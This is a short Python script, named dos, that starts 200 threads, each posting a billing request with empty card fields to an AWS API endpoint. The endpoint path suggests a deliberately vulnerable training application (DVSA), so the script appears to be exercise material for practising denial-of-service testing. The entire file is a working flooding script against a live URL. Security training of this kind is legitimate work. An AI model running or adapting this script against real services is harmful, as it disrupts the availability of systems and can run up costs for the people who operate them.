import threading
import requests
import time

def dos():
    payload = '{ "action":"billing", "order-id": "", "data": {"ccn": "", "exp": "", "cvv": ""} }'   
    url = "https://9v3sovt0ed.execute-api.us-east-1.amazonaws.com/dvsa/order"
    headers = {"Authorization": ""} 
    r = requests.post(url, data=payload, headers=headers)
    print(r.text)

threads = []
for i in range(200):
    t = threading.Thread(target=dos)
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()

print("DONE!")